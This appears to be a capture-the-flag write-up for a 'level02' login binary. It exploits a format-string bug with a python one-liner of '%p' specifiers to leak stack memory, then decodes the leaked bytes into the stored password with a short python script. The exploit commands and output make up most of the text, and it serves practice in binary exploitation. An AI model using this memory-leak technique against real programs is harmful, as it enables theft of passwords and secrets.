The binary opens the password and keeps the reference in memory, and we can print the memory with printf so:
```shell
bash$ ./level02 < <(python -c 'print "%p " *50')
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x7fffffffe4c0 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6b8 0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x207025 (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) << STARTS HERE 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d >> END HERE (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
```
With this python script, we are able to decode the bytes:
```python
import struct

b64 = lambda x: struct.pack("Q", x);
password = ""
values = [0x756e505234376848, 0x45414a3561733951, 0x377a7143574e6758, 0x354a35686e475873, 0x48336750664b394d]

for hex_value in values:
    password = password + b64(hex_value)

print(password)
```
```shell
cat | python << EOF
> import struct
>
> b64 = lambda x: struct.pack("Q", x);
> password = ""
> values = [0x756e505234376848, 0x45414a3561733951, 0x377a7143574e6758, 0x354a35686e475873, 0x48336750664b394d]
>
> for hex_value in values:
>     password = password + b64(hex_value)
>
> print(password)
> EOF
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
